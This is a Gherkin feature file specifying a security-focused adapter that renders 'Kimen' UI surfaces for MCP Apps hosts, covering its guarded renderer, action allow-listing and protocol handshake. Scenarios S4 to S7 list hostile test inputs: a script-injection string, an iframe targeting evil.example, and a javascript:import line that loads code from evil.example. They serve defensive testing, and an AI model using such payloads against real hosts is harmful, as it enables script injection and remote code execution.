Feature: MCP Apps adapter
  Kimen surfaces reach MCP Apps hosts as predeclared, self-contained
  resources rendered exclusively through the neutral catalog and its guarded
  renderer; the protocol is absorbed inside a disposable adapter that
  declares exactly what it supports.

  Rule: Surfaces are predeclared, self-contained and auditable

    # S1
    Scenario: A tool declares its Kimen surface and the host resolves it
      Given an MCP tool whose metadata declares a Kimen surface for its results
      When the host resolves the declared surface
      Then the surface is served as a resource addressed by a ui:// URI
      And the resource is one self-contained HTML document embedding the catalog renderer

    # S2
    Scenario: The surface document references no external origin
      Given the adapter's packaged surface document
      When the host audits the document before first render
      Then every script and style the document needs is inline
      And neither the document nor its declared content policy references an external network origin

    # S3
    Scenario: A host without interactive surfaces still receives a usable answer
      Given a host that does not support interactive tool surfaces
      When the tool returns a result through the adapter
      Then the result carries text content that describes the outcome without the surface

  Rule: The guarded renderer is the only render path

    # S4
    Scenario Outline: Hostile spec content is refused at the guardrail
      Given a tool result whose surface spec contains <hostile-input>
      When the surface renders the result
      Then rendering refuses the hostile part and reports <refusal>
      And every component that does render comes from the catalog

      Examples:
        | hostile-input                                        | refusal                      |
        | an "iframe" component targeting https://evil.example | the unknown component name   |
        | an undeclared property "onclick" on a catalog button | the undeclared property name |

    # S5
    Scenario: Markup smuggled in result data stays inert
      Given a tool result whose text field contains "<script>document.title='owned'</script>"
      When the surface renders the result
      Then the field appears as inert text
      And the surface document title is unchanged

    # S6
    Scenario: Only declared actions leave the surface
      Given a rendered surface whose spec declares only the action "refresh-inventory"
      When the surface attempts to dispatch the action "transfer-funds"
      Then no message for "transfer-funds" reaches the host
      And the attempt is reported as refused
      And dispatching "refresh-inventory" sends one tools/call request naming the adapter's app-only action tool

    # S7
    Scenario: A message without the protocol envelope never becomes state
      Given a rendered surface connected to its host
      When the surface receives the raw string "javascript:import('https://evil.example/x.js')" instead of a protocol message
      Then the surface ignores it and its rendered state is unchanged

  Rule: Protocol churn is absorbed inside the disposable adapter

    # S8
    Scenario: An undeclared protocol version is refused, never guessed
      Given a host whose ui/initialize result negotiates an MCP Apps protocol version absent from the adapter's compatibility matrix
      When the host and the surface negotiate their connection
      Then the adapter refuses the connection naming the versions it supports
      And the surface never sends ui/notifications/initialized
      And no surface renders under the undeclared version

    # S9
    Scenario: The compatibility matrix declares exact protocol versions
      Given the packaged adapter
      When a consumer inspects its compatibility matrix
      Then every row pairs an adapter version with the exact MCP Apps protocol version(s) it supports
      And no placeholder row remains

    # S10
    Scenario: No protocol type reaches the core packages
      Given the workspace with the adapter package present
      When module boundaries are evaluated
      Then no MCP Apps protocol type is importable from the elements or catalog packages

  Rule: The surface speaks the MCP Apps 2026-01-26 lifecycle

    # S11
    Scenario: The surface opens the connection with the ui/initialize handshake
      Given the surface document embedded by an MCP Apps host
      When the surface starts
      Then its only message before the host answers is one ui/initialize request carrying its app info, its capabilities and protocol version "2026-01-26"
      And after the host's successful result it sends ui/notifications/initialized

    # S12
    Scenario: Host traffic before the handshake completes never becomes state
      Given a surface whose ui/initialize request has not been answered
      When the host sends a ui/notifications/tool-result carrying a valid surface spec
      Then nothing renders and the message is reported as refused
      And no action can leave the surface

    # S13
    Scenario: A tool result notification renders through the guarded renderer
      Given a surface whose handshake has completed
      When the host sends ui/notifications/tool-result whose structured content carries a catalog spec
      Then the spec renders through the guarded renderer
      And a tool result without a Kimen surface is refused and leaves the rendered state unchanged

    # S14
    Scenario: The host's teardown request is answered and closes the surface
      Given a rendered surface whose handshake has completed
      When the host sends a ui/resource-teardown request
      Then the surface answers that request with an empty result
      And no action leaves the surface afterwards

    # S15
    Scenario: A host request the surface does not implement gets a JSON-RPC error
      Given a surface whose handshake has completed
      When the host sends a request for a method the surface does not implement
      Then the surface answers with a JSON-RPC "method not found" error for that request id
